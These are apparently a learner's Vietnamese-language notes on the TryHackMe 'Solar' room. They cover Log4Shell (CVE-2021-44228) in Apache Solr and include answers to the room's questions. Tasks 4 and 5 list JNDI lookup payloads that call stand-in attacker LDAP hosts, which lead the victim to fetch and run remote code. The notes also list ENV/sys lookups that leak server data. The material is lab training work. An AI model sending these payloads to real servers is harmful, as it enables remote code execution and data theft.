- link bt: https://tryhackme.com/room/solar<br>
- link hướng dẫn: https://www.youtube.com/watch?v=c0OwAnyBGKI&t=289s<br>

*. task 1<br>
- lỗ hổng: CVE-2021-44228 ảnh hưởng đến gói ghi nhật kí của java log4j
- cuộc tấn công: Log4Shell cho phép thực thi mã từ xa<br>

*. task 2<br>
- trinh sát tìm cổng đang mở bằng: rustscan -a 10.10.85.83 -- -sV -sC:<br>

![image](https://github.com/chaumoon/Lm_BT_CEH/assets/127403046/4d022816-debb-42e9-b224-060a2cce0152)<br>

1. What service is running on port 8983? (Just the name of the software)<br>
As: Apache Solr<br>

*. task 3<br>
1. Take a close look at the first page visible when navigating to http://10.10.85.83:8983. You should be able to see clear indicators that log4j is in use within the application for logging activity. What is the -Dsolr.log.dir argument set to, displayed on the front page?<br>
- truy cập: http://10.10.85.83:8983/<br>

![image](https://github.com/chaumoon/Lm_BT_CEH/assets/127403046/b59f0c97-6842-4104-9db1-29662ccf85e2)<br>

As: /var/solr/logs<br>

2. One file has a significant number of INFO entries showing repeated requests to one specific URL endpoint. Which file includes contains this repeated entry? (Just the filename itself, no path needed)<br>
- tải file về và giải nén:<br>

![image](https://github.com/chaumoon/Lm_BT_CEH/assets/127403046/7bab19c9-2d47-44f1-bd42-bb8500962607)<br>

As: solr.log<br>

3. What "path" or URL endpoint is indicated in these repeated entries?<br>
- đọc file solr.lod<br>

![image](https://github.com/chaumoon/Lm_BT_CEH/assets/127403046/57ec5c27-187c-41cc-ac0b-80e661e72bff)<br>

As: /admin/cores<br>

4. Viewing these log entries, what field name indicates some data entrypoint that you as a user could control? (Just the field name)<br>
As: params<br>

*. task 4<br>
- cú pháp khác cx can đc thực giống như khi nó đc ghi vào tệp nhật kí<br>
. cú pháp:<br>
- ${sys:os.name}
- ${sys:user.name}
- ${log4j:configParentLocation}
- ${ENV:PATH}
- ${ENV:HOSTNAME}
- ${java:version}<br>

- cú pháp tận dụng lỗ hổng: ${jndi:ldap://ATTACKERCONTROLLEDHOST}
- xài jndi: để truy cập các tài nguyên bên ngoài vốn đc vũ khí hóa trong cuộc tấn công này
- xài ldap//: mục tiêu sẽ tiếp cận điểm cuối (vị trí do kẻ tấn công kiểm soát) thông qua ldap
- mục tiêu sẽ tạo kết nối vs 1 vị trí bên ngoài
- cú pháp này đc nhập ở bất cứ nơi nào có dữ liệu đc ứng dụng ghi lại<br>

*. task 5<br>
- kết quả task 4 là các kí tự lạ -> xài ldap thực sự
- tạo 1 máy chủ giới thiệu ldap -> điều hướng yêu cầu nạn nhân đến nơi bn can lưu trữ tải trọng thứ cấp mà cuối cùng sẽ chạy mã trên mục tiêu<br>
. liên hệ vs máy chủ giới thiệu ldap: ${jndi:ldap://attackerserver:1389/Resource}<br>
. máy chủ ldap chuyển yêu cầu sang: http://attackerserver/resource<br>
. nạn nhân lấy và thực thi mã trong: http://attackerserver/resource<br>

- cần máy chủ http:<br>
. python3 -m http.server<br>
. php -S 0.0.0.0:8000<br>

1. What is the output of running this command? (You should leave this terminal window open as it will be actively awaiting connections)<br>
As: Listening on 0.0.0.0:1389<br>

*. task 9<br>
1. What is the full path of the specific solr.in.sh file?<br>
As: /etc/default/solr.in.sh
